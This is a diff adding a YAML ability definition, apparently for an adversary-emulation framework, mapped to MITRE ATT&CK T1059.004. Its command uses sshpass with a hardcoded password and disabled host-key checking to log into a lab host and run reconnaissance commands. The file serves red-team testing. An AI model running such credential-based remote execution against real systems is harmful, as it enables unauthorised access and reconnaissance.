@@ -1,0 +1,15 @@
+- id: ex01-ssh-shell
+  name: Remote Shell Execution via SSH
+  description: Execute commands on web-server-1 using compromised SSH credentials
+  tactic: execution
+  technique:
+    attack_id: T1059.004
+    name: Command and Scripting Interpreter - Unix Shell
+  platforms:
+    linux:
+      sh:
+        command: |
+          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.21 'id; hostname; uname -a; ip addr show | grep inet' 2>/dev/null || echo 'SSH exec attempted'
+
+  singleton: false
+  repeatable: false
